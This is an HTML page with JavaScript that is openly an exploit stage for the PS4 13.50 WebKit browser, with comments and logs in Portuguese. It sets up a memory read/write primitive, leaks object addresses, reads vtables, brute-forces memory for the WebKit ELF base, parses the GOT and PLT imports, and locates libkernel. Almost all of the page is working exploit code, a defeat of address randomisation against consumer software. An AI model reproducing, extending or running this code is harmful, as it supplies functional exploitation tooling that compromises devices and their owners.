<body>

<h1>PS4 13.50 — WebKit Base Finder</h1>
<div id="status">Inicializando exploit...</div>

<!-- Info panel -->
<div class="panel" id="leaks">

<script type="module">
import { establishPrimitive } from "./resources/core.js";
import { installWindowP }     from "./resources/mem.js";
import { int64 }              from "./resources/int64.js";

/* ──────────────────────────────────────────────────────────────
   GLOBALS
────────────────────────────────────────────────────────────── */
let ctorI64   = null;   // int64: nativeCtor address
let vtableI64 = null;   // int64: textarea vtable ptr
let baseI64   = null;   // int64: WebKit ELF base (found by brute force)
let bruteRunning = false;
let bruteStop    = false;

/* ──────────────────────────────────────────────────────────────
   UI HELPERS
────────────────────────────────────────────────────────────── */
const logBox    = document.getElementById("log");
const statusEl  = document.getElementById("status");
const progWrap  = document.getElementById("prog-wrap");
const progBar   = document.getElementById("prog-bar");
const progLabel = document.getElementById("prog-label");
const btnStop   = document.getElementById("btnStop");

function log(msg, cls) {
  const line = document.createElement("div");
  line.className = cls || "info";
  line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
  logBox.appendChild(line);
  logBox.scrollTop = logBox.scrollHeight;
  // Keep last 200 entries
  while (logBox.children.length > 200) logBox.removeChild(logBox.firstChild);
}

function logH(msg) { log("=== " + msg + " ===", "header"); }

window.clearLog = () => { logBox.innerHTML = ""; };

function setStatus(txt, cls) {
  statusEl.textContent = txt;
  statusEl.style.color = cls === "ok"  ? "#4ade80"
                       : cls === "err" ? "#f87171"
                       : cls === "warn"? "#fbbf24" : "#60a5fa";
}

function showProgress(pct, label) {
  progWrap.style.display  = "block";
  progLabel.style.display = "block";
  progBar.style.width = pct + "%";
  progLabel.textContent = label;
}

function hideProgress() {
  progWrap.style.display  = "none";
  progLabel.style.display = "none";
}

function setVal(id, txt, cls) {
  const el = document.getElementById(id);
  el.textContent = txt;
  el.className = "value" + (cls ? " " + cls : "");
}

/* ──────────────────────────────────────────────────────────────
   INT64 HELPERS  (no bitwise ops on high words)
────────────────────────────────────────────────────────────── */
function numToI64(n) {
  const hi  = Math.floor(n / 0x100000000) >>> 0;
  const lo  = (n - hi * 0x100000000) >>> 0;
  return new int64(lo, hi);
}

function i64ToNum(a) {
  return a.hi * 0x100000000 + a.low;
}

// Align down to 0x1000 (4 KB page)
function alignPage(a) {
  return a.and64(0xFFFFF000, 0xFFFFFFFF);
}

// Align down to 0x4000 (16 KB, typical PRX segment alignment)
function align16k(a) {
  return a.and64(0xFFFFC000, 0xFFFFFFFF);
}

// Check if address looks like a valid PS4 user-space pointer
function isValidPS4Ptr(a) {
  const n = i64ToNum(a);
  return n >= 0x800000000 && n <= 0xFFFFFFFFFF;
}

/* ──────────────────────────────────────────────────────────────
   READ HELPERS  (all expect int64 address argument)
────────────────────────────────────────────────────────────── */
const p = () => window.p;

function r4(a)  { return (p().read4(a) >>> 0); }   // unsigned 32-bit
function r8(a)  { return p().read8(a); }            // int64
function r8n(a) { return i64ToNum(r8(a)); }         // as JS number

/* ──────────────────────────────────────────────────────────────
   SCAN VTABLE OFFSETS
────────────────────────────────────────────────────────────── */
window.scanVtable = async function() {
  logH("SCAN VTABLE OFFSETS (textarea, 0x00–0x80)");

  const textArea = document.createElement("textarea");
  const objAddr  = p().leakval(textArea);
  setVal("l-obj", "0x" + objAddr.toString(16));
  log("textarea obj @ 0x" + objAddr.toString(16), "ok");

  const div = document.getElementById("offsets");
  div.innerHTML = "";

  for (let off = 0; off <= 0x80; off += 8) {
    try {
      const ptr = r8(objAddr.add32(off));
      if (!isValidPS4Ptr(ptr)) continue;
      const pn   = i64ToNum(ptr);
      const isVt = (pn & 0x3FFF) === 0; // 16k-aligned → likely vtable
      const cls  = isVt ? "found" : "ok";
      log("  off 0x" + off.toString(16).padStart(2, "0") + " → 0x" + ptr.toString(16) + (isVt ? " ← vtable?" : ""), cls);

      const chip = document.createElement("button");
      chip.className = "off-chip" + (isVt ? " found" : "");
      chip.textContent = "0x" + off.toString(16) + " ⟹ 0x" + ptr.toString(16).slice(0,5) + "…" + ptr.toString(16).slice(-5);
      chip.onclick = () => readVtableSlots(off, ptr);
      div.appendChild(chip);

      if (off === 0x10) {
        vtableI64 = ptr;
        setVal("l-vt", "0x" + ptr.toString(16), "good");
        log("  → vtableI64 = 0x" + ptr.toString(16), "found");
      }
    } catch (_) {}
  }

  if (!vtableI64) {
    log("Nenhum ponteiro válido em 0x10 — tente o chip correto acima", "warn");
  } else {
    log("Scan completo. Vtable em 0x10 confirmado.", "ok");
  }
};

/* ──────────────────────────────────────────────────────────────
   READ VTABLE SLOTS (log function pointer entries)
────────────────────────────────────────────────────────────── */
window.readVtableSlots = function(objOff, vtPtr) {
  log("--- vtable @ 0x" + vtPtr.toString(16) + " (obj+0x" + objOff.toString(16) + ") ---", "header");
  let minAddr = Infinity;
  for (let i = 0; i < 32; i++) {
    try {
      const slot = r8(vtPtr.add32(i * 8));
      if (!isValidPS4Ptr(slot)) continue;
      const n = i64ToNum(slot);
      if (n < minAddr) minAddr = n;
      log("  [" + i + "] 0x" + slot.toString(16), "ok");
    } catch (e) { break; }
  }
  if (minAddr < Infinity)
    log("  Min function ptr: 0x" + minAddr.toString(16), "warn");
};

/* ──────────────────────────────────────────────────────────────
   TEST CUSTOM OFFSET
────────────────────────────────────────────────────────────── */
window.testCustomOffset = async function() {
  if (!ctorI64) { log("ctorI64 não disponível", "err"); return; }
  const raw = document.getElementById("custom-off").value.trim();
  const off = parseInt(raw, 16);
  if (isNaN(off) || off < 0) { log("Offset inválido: " + raw, "err"); return; }

  const base = alignPage(ctorI64.sub32(off));
  log("Testando ctor - 0x" + off.toString(16) + " = 0x" + base.toString(16), "warn");
  try {
    const magic = r4(base);
    const hex   = "0x" + magic.toString(16).padStart(8, "0");
    if (magic === 0x464c457f) {
      log("✅ MAGIC ELF ENCONTRADO! base = 0x" + base.toString(16), "found");
      onBaseFound(base);
    } else {
      log("  magic = " + hex + " (não é ELF)", "warn");
    }
  } catch (e) {
    log("  CRASH ao ler → página não mapeada", "err");
  }
};

/* ──────────────────────────────────────────────────────────────
   BRUTE FORCE — passo 0x1000 (mais robusto que 0x4000)
   Justificativa: PS4 PRX base é tipicamente 0x4000-aligned,
   mas usar 0x1000 cobre edge cases sem custo prático
   (30 MB @ 0x1000 steps = 7680 iters ≈ poucos segundos).
────────────────────────────────────────────────────────────── */
window.startBrute = async function() {
  if (bruteRunning)   { log("Scan já em andamento.", "warn"); return; }
  if (!ctorI64)       { log("ctorI64 não disponível", "err"); return; }

  const anchor = vtableI64 || ctorI64;
  logH("BRUTE FORCE — passo 0x1000 (4 KB), âncora = 0x" + anchor.toString(16));

  const MAX_MB   = 256;
  const STEP     = 0x1000;
  const totalPgs = (MAX_MB * 1024 * 1024) / STEP;

  // Estimated base (hint from PS4 13.50 geometry: ctor ≈ 30 MB from base)
  const estimatedBase = ctorI64.sub32(0x1E00000);
  log("Base estimada (hint 30 MB abaixo do ctor): 0x" + estimatedBase.toString(16), "warn");
  log("Scan: " + MAX_MB + " MB, " + totalPgs + " blocos @ 0x1000", "info");

  bruteRunning = true;
  bruteStop    = false;
  btnStop.style.display = "inline-block";
  document.getElementById("btnBrute").disabled = true;
  showProgress(0, "0 / " + totalPgs + " blocos");

  let current = alignPage(anchor);
  const hardEnd = numToI64(0x800000000); // never go below user-space floor

  let tested = 0;

  while (tested < totalPgs) {
    if (bruteStop) {
      log("Scan interrompido pelo usuário.", "warn");
      break;
    }

    // Check lower bound
    if (i64ToNum(current) <= i64ToNum(hardEnd)) {
      log("Atingiu piso do espaço de usuário PS4 (0x800000000). Parando.", "warn");
      break;
    }

    // Check ELF magic
    try {
      const magic = r4(current);
      if (magic === 0x464c457f) {
        log("✅ ELF MAGIC @ 0x" + current.toString(16) + " após " + tested + " blocos!", "found");
        bruteRunning = false;
        btnStop.style.display = "none";
        document.getElementById("btnBrute").disabled = false;
        hideProgress();
        onBaseFound(current);
        return;
      }
    } catch (_) {
      // Página não mapeada — skip (não causa crash no PS4 com primitiva widened)
    }

    tested++;
    current = current.sub32(STEP);

    // Yield + progress every 256 blocks
    if (tested % 256 === 0) {
      const pct  = Math.min(100, (tested / totalPgs) * 100);
      const dist = i64ToNum(anchor) - i64ToNum(current);
      const distMB = (dist / 1024 / 1024).toFixed(1);
      showProgress(pct, tested + " / " + totalPgs + " blocos · " + distMB + " MB varridos · atual: 0x" + current.toString(16));

      // Log every 2048 blocks (every 8 MB)
      if (tested % 2048 === 0) {
        log("  " + tested + " blocos, " + distMB + " MB varridos. Atual: 0x" + current.toString(16), "info");
      }

      await new Promise(r => setTimeout(r, 0));
    }
  }

  bruteRunning = false;
  btnStop.style.display = "none";
  document.getElementById("btnBrute").disabled = false;
  hideProgress();

  if (!bruteStop && !baseI64) {
    log("Brute force completo sem encontrar ELF magic em " + MAX_MB + " MB.", "err");
    log("Possíveis causas:", "warn");
    log("  1) PS4 não mapeia ELF header do SPRX (use scan por padrão alternativo)", "warn");
    log("  2) Base está além de " + MAX_MB + " MB abaixo do âncora", "warn");
    log("  3) Tente o offset customizado: se ctor_rva conhecido, informe acima", "warn");
  }
};

window.stopBrute = function() {
  bruteStop = true;
};

/* ──────────────────────────────────────────────────────────────
   BASE ENCONTRADA → parse ELF + relatório
────────────────────────────────────────────────────────────── */
function onBaseFound(base) {
  baseI64 = base;
  const baseHex = "0x" + base.toString(16);
  setVal("l-base", baseHex, "good");
  setStatus("BASE ENCONTRADA: " + baseHex, "ok");

  if (ctorI64) {
    const ctorRva = i64ToNum(ctorI64) - i64ToNum(base);
    setVal("l-ctor-rva", "+0x" + ctorRva.toString(16), "good");
    log("ctor RVA = +0x" + ctorRva.toString(16), "found");
  }
  if (vtableI64) {
    const vtRva = i64ToNum(vtableI64) - i64ToNum(base);
    setVal("l-vt-rva", "+0x" + vtRva.toString(16), "good");
    log("vtable RVA = +0x" + vtRva.toString(16), "found");
  }

  document.getElementById("btnElf").disabled = false;
  // Auto-run ELF analysis
  analyzeElf();
}

/* ──────────────────────────────────────────────────────────────
   ELF ANALYSIS  (parse após encontrar base)
────────────────────────────────────────────────────────────── */
window.analyzeElf = function() {
  if (!baseI64) { log("Base não encontrada ainda. Execute o Brute Force.", "err"); return; }
  logH("ELF ANALYSIS @ 0x" + baseI64.toString(16));

  const elfResults = document.getElementById("elf-results");
  elfResults.style.display = "block";
  elfResults.innerHTML = "";

  function elfLog(msg, cls) {
    const line = document.createElement("div");
    line.className = cls ? "elf-" + cls : "";
    line.textContent = msg;
    elfResults.appendChild(line);
    // Also log to main log
    log(msg, cls === "head" ? "header" : cls === "ok" ? "ok" : "info");
  }

  try {
    // ELF header validation
    const magic  = r4(baseI64);
    const eclass = r4(baseI64.add32(4)) & 0xFF; // e_class: 1=32b, 2=64b
    const edata  = (r4(baseI64.add32(4)) >> 8) & 0xFF; // e_data: 1=LE, 2=BE
    elfLog("e_magic:  0x" + magic.toString(16).padStart(8,"0") + (magic === 0x464c457f ? " ✓" : " ✗"), magic === 0x464c457f ? "ok" : "warn");
    elfLog("e_class:  " + eclass + (eclass === 2 ? " (64-bit) ✓" : " (?)"), "ok");
    elfLog("e_data:   " + edata  + (edata  === 1 ? " (LE) ✓"     : " (?)"), "ok");

    // e_phoff (64-bit) at 0x20, e_phnum (16-bit) at 0x38
    const e_phoff = r8(baseI64.add32(0x20)).low;   // fits in 32 bits for 70MB binary
    const e_phnum = r4(baseI64.add32(0x38)) & 0xFFFF;
    elfLog("e_phoff:  0x" + e_phoff.toString(16), "ok");
    elfLog("e_phnum:  " + e_phnum, "ok");

    // Parse program headers
    elfLog("— Program Headers —", "head");
    const PHDR = 0x38; // sizeof(Elf64_Phdr)
    let dt_pltgot = null, dt_strtab = null, dt_symtab = null;
    let dt_jmprel = null, dt_jmprelsz = null;
    let dt_rela   = null, dt_relasz  = null;
    let dt_syment = null;

    for (let i = 0; i < e_phnum && i < 32; i++) {
      const phdr   = baseI64.add32(e_phoff + i * PHDR);
      const ptype  = r4(phdr);
      const pvaddr = r8(phdr.add32(0x10)).low;
      const pmemsz = r8(phdr.add32(0x28)).low;
      const ptypes = ["NULL","LOAD","DYNAMIC","INTERP","NOTE","SHLIB","PHDR","TLS"];
      const tname  = ptype < ptypes.length ? ptypes[ptype] : "0x" + ptype.toString(16);
      elfLog("  PT_" + tname.padEnd(8) + " vaddr=+0x" + pvaddr.toString(16).padStart(8,"0") + " memsz=0x" + pmemsz.toString(16), "ok");

      if (ptype === 2 /* PT_DYNAMIC */) {
        elfLog("  → Parsing PT_DYNAMIC...", "ok");
        const dynBase = baseI64.add32(pvaddr);
        for (let off = 0; ; off += 0x10) {
          const ent   = dynBase.add32(off);
          const d_tag = r8(ent).low;
          const d_val = r8(ent.add32(8));
          if (d_tag === 0) break;
          switch (d_tag) {
            case 3:  dt_pltgot  = d_val; break;
            case 5:  dt_strtab  = d_val; break;
            case 6:  dt_symtab  = d_val; break;
            case 7:  dt_rela    = d_val; break;
            case 8:  dt_relasz  = d_val; break;
            case 11: dt_syment  = d_val; break;
            case 23: dt_jmprel  = d_val; break;
            case 2:  dt_jmprelsz= d_val; break;
          }
        }
      }
    }

    // GOT
    elfLog("— GOT —", "head");
    if (!dt_pltgot) {
      elfLog("  DT_PLTGOT ausente!", "warn");
    } else {
      const gotBase  = baseI64.add32(dt_pltgot.low);
      const wkLo     = i64ToNum(baseI64);
      const wkHi     = wkLo + 0x8000000; // assume < 128 MB
      elfLog("  GOT @ 0x" + gotBase.toString(16) + " (offset +0x" + dt_pltgot.toString(16) + ")", "ok");

      const externals = [];
      for (let i = 0; i < 128; i++) {
        const entry = r8(gotBase.add32(i * 8));
        const en    = i64ToNum(entry);
        const inWk  = en >= wkLo && en < wkHi;
        const valid = entry.hi > 0 && entry.hi <= 0xFFFF;
        const ext   = valid && !inWk;
        if (ext) externals.push({ idx: i, addr: entry });
        if (valid) {
          elfLog("  GOT[" + String(i).padStart(3) + "] = 0x" + entry.toString(16) + (ext ? " ← EXTERNO" : " [WebKit]"), ext ? "warn" : "ok");
        }
      }

      // RELA / JMP_REL imports (symbol names)
      const relaAddr = dt_jmprel || dt_rela;
      const relaSz   = dt_jmprelsz || dt_relasz;
      const symEnt   = dt_syment ? dt_syment.low : 0x18;
      if (relaAddr && relaSz && dt_strtab && dt_symtab) {
        elfLog("— PLT Imports —", "head");
        const relaBase  = baseI64.add32(relaAddr.low);
        const relaCount = Math.min(relaSz.low / 0x18, 256);
        for (let i = 0; i < relaCount; i++) {
          const ent      = relaBase.add32(i * 0x18);
          const r_offset = r8(ent).low;
          const r_info   = r8(ent.add32(8));
          const symIdx   = r_info.hi;
          if (symIdx === 0) continue;
          // Read symbol name
          const symEntry = baseI64.add32(dt_symtab.low + symIdx * symEnt);
          const st_name  = r4(symEntry);
          const namePtr  = baseI64.add32(dt_strtab.low + st_name);
          let name = "";
          for (let c = 0; c < 64; c++) {
            const ch = p().read1(namePtr.add32(c));
            if (ch === 0) break;
            name += String.fromCharCode(ch);
          }
          const gotEntry = r8(baseI64.add32(r_offset));
          elfLog("  PLT[" + String(i).padStart(3) + "] " + name.padEnd(40) + " → 0x" + gotEntry.toString(16), "ok");
        }
      }

      // Libkernel search via external GOT entries
      elfLog("— Libkernel —", "head");
      let libkernelBase = null;
      for (const { idx, addr } of externals.slice(0, 8)) {
        elfLog("  Tentando GOT[" + idx + "] = 0x" + addr.toString(16) + "...", "ok");
        let cur = alignPage(addr);
        for (let j = 0; j < 4096; j++) { // scan 16 MB backwards (4096 × 0x1000)
          if (i64ToNum(cur) < 0x200000000) break;
          try {
            const m = r4(cur);
            if (m === 0x464c457f) {
              libkernelBase = cur;
              break;
            }
          } catch (_) {}
          cur = cur.sub32(0x1000);
        }
        if (libkernelBase) break;
      }
      if (libkernelBase) {
        elfLog("  libkernel base = 0x" + libkernelBase.toString(16), "ok");
        setVal("l-lk", "0x" + libkernelBase.toString(16), "good");
        window.__libkernelBase = libkernelBase;
      } else {
        elfLog("  libkernel não localizada via GOT externos", "warn");
      }
    }

    elfLog("— Sumário Final —", "head");
    elfLog("  WebKit base:   0x" + baseI64.toString(16),              "ok");
    if (dt_pltgot) elfLog("  GOT RVA:      +0x" + dt_pltgot.toString(16), "ok");
    if (ctorI64) {
      const rv = i64ToNum(ctorI64) - i64ToNum(baseI64);
      elfLog("  ctor RVA:     +0x" + rv.toString(16), "ok");
    }
    if (vtableI64) {
      const rv = i64ToNum(vtableI64) - i64ToNum(baseI64);
      elfLog("  vtable RVA:   +0x" + rv.toString(16), "ok");
    }

  } catch (e) {
    elfLog("ERRO no parse ELF: " + e.message, "warn");
    log("ELF parse exception: " + e.stack, "err");
  }
};

/* ──────────────────────────────────────────────────────────────
   BOOTSTRAP
────────────────────────────────────────────────────────────── */
log("Carregando módulos...", "ok");

establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
  .then(carrier => {
    const prim = installWindowP(carrier, {
      onEvent: (tag, detail) => log(tag + ": " + detail, "info"),
      promote: true
    });

    window.__carrier = carrier;
    window.__prim    = prim;
    window.p         = prim;
    window.int64     = int64;

    log("Primitivo RW ativo!", "ok");

    // Capture ctor address
    const ctor = globalThis.__ps5NativeCtor;
    if (typeof ctor === "number" && ctor > 0x100000000) {
      ctorI64 = numToI64(ctor);
      setVal("l-ctor", "0x" + ctorI64.toString(16), "good");
      log("__ps5NativeCtor = 0x" + ctorI64.toString(16), "ok");

      // Pre-fill custom offset input with estimated ctor RVA for PS4 13.50
      // (empirically derived: vtable ~71 MB from base, ctor ~30 MB from base)
      document.getElementById("custom-off").value = "0x1E00000";
    }

    if (carrier.textareaAddress) {
      log("textareaAddress = 0x" + carrier.textareaAddress.toString(16), "ok");
    }

    // Enable all buttons
    document.getElementById("btnScan").disabled   = false;
    document.getElementById("btnBrute").disabled  = false;
    document.getElementById("btnCustom").disabled = false;

    setStatus("RW Primitivo OK — pronto. Execute 'Scan VTable' depois 'Brute Force Base'", "ok");

    // Sanity
    try {
      const a = prim.leakval(prim);
      log("sanity leakval(prim) = 0x" + a.toString(16), "ok");
    } catch (e) {
      log("sanity leak falhou: " + e.message, "err");
    }
  })
  .catch(err => {
    log("FALHA: " + err.name + ": " + err.message, "err");
    setStatus("Exploit falhou: " + err.message, "err");
  });
